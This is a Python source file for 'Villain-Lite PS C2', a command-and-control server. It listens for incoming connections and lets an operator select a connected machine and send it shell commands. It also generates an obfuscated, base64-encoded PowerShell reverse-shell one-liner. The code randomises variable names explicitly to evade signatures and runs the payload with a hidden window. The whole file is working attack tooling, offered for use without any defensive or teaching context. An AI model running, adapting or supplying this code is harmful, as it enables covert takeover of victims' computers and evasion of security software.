import socket
import threading
import base64
import random
import string

# Dictionary to store connected clients: {client_id: (conn, addr)}
clients = {}
client_id = 0
selected_client = None  # Currently selected client for interaction

def handle_client(conn, addr, id):
    """
    Handles incoming data from a connected client.
    """
    global clients, selected_client
    print(f"[+] Client {id} connected: {addr[0]}:{addr[1]}")

    try:
        conn.send(b"Connected to Villain-Lite PS Server\n")
    except:
        pass

    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            # Only print output from the selected client
            if selected_client == id:
                print(f"\n[Client {id} output]:\n{data.decode(errors='ignore')}\n(PS Client {id}) >>> ", end='', flush=True)
        except:
            break

    print(f"[-] Client {id} disconnected.")
    conn.close()
    if id in clients:
        del clients[id]
    if selected_client == id:
        selected_client = None

def accept_clients(server):
    """
    Accepts incoming client connections and starts handler threads.
    """
    global client_id
    while True:
        conn, addr = server.accept()
        clients[client_id] = (conn, addr)
        threading.Thread(target=handle_client, args=(conn, addr, client_id), daemon=True).start()
        client_id += 1

def random_var(length=4):
    """
    Generates a random variable name of given length.
    """
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def obfuscated_payload(ip, port):
    """
    Generates an obfuscated, base64-encoded PowerShell reverse shell payload.
    """
    # Randomize variable names to evade signatures
    v_c = random_var()
    v_s = random_var()
    v_b = random_var()
    v_i = random_var()
    v_d = random_var()
    v_r = random_var()
    v_r2 = random_var()
    v_sb = random_var()

    raw = f"""
    ${v_c}=New-Object Net.Sockets.TCPClient('{ip}',{port});
    ${v_s}=${v_c}.GetStream();
    [byte[]]${v_b}=0..65535|%{{0}};
    while(($${v_i}=${v_s}.Read($${v_b},0,$${v_b}.Length)) -ne 0){{
        $${v_d}=(New-Object Text.ASCIIEncoding).GetString($${v_b},0,$${v_i});
        $${v_r}=(iex $${v_d} 2>&1|Out-String);
        $${v_r2}=$${v_r}+'PS '+(pwd).Path+'> ';
        $${v_sb}=[text.encoding]::ASCII.GetBytes($${v_r2});
        $${v_s}.Write($${v_sb},0,$${v_sb}.Length)
    }}
    """

    # Minify and base64 encode for PowerShell -EncodedCommand parameter (UTF-16LE)
    raw_min = ' '.join(line.strip() for line in raw.strip().splitlines())
    encoded_bytes = base64.b64encode(raw_min.encode('utf-16le')).decode()
    payload = f"powershell.exe -nop -w hidden -EncodedCommand {encoded_bytes}"
    return payload

def main():
    global selected_client

    host = "0.0.0.0"  # Listen on all interfaces
    port = 4444       # Default listening port

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)

    print(f"[+] Villain-Lite PS C2 running on {host}:{port}")

    # Start accepting clients in a separate thread
    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()

    while True:
        cmd = input("Villain-Lite> ").strip()

        if cmd == "help":
            print("Commands:")
            print("  list                   - List connected clients")
            print("  select <id>            - Select client for interaction")
            print("  shell                  - Enter interactive shell with selected client")
            print("  generate <ip> <port>   - Generate obfuscated PowerShell reverse shell payload")
            print("  exit                   - Exit the server")
            continue

        if cmd == "list":
            if clients:
                print("Connected clients:")
                for cid, (conn, addr) in clients.items():
                    print(f"  ID {cid} - {addr[0]}:{addr[1]}")
            else:
                print("No clients connected.")
            continue

        if cmd.startswith("select "):
            try:
                cid = int(cmd.split()[1])
                if cid in clients:
                    selected_client = cid
                    print(f"Selected client {cid}")
                else:
                    print(f"No client with ID {cid}")
            except:
                print("Invalid client ID.")
            continue

        if cmd == "shell":
            if selected_client is None:
                print("No client selected. Use 'select <id>' first.")
                continue

            conn, addr = clients.get(selected_client, (None, None))
            if not conn:
                print("Selected client disconnected.")
                selected_client = None
                continue

            print(f"Starting shell with client {selected_client}. Type 'exit' to leave shell.")
            while True:
                try:
                    command = input(f"(PS Client {selected_client}) >>> ").strip()
                    if command == "exit":
                        break
                    if not command:
                        continue
                    conn.send(command.encode())
                except KeyboardInterrupt:
                    print("\nExiting shell.")
                    break
                except Exception as e:
                    print(f"Error: {e}")
                    break
            continue

        if cmd.startswith("generate "):
            parts = cmd.split()
            if len(parts) != 3:
                print("Usage: generate <ip> <port>")
                continue
            ip = parts[1]
            try:
                portnum = int(parts[2])
            except:
                print("Port must be a number.")
                continue
            payload = obfuscated_payload(ip, portnum)
            print("\n[+] Obfuscated PowerShell Payload One-Liner:\n")
            print(payload)
            print("\nCopy and paste this on the target machine PowerShell prompt.\n")
            continue

        if cmd == "exit":
            print("Exiting Villain-Lite...")
            for cid, (conn, _) in clients.items():
                try:
                    conn.send(b"exit")
                    conn.close()
                except:
                    pass
            break

        print("Unknown command. Type 'help' for commands.")

if __name__ == "__main__":
    main()
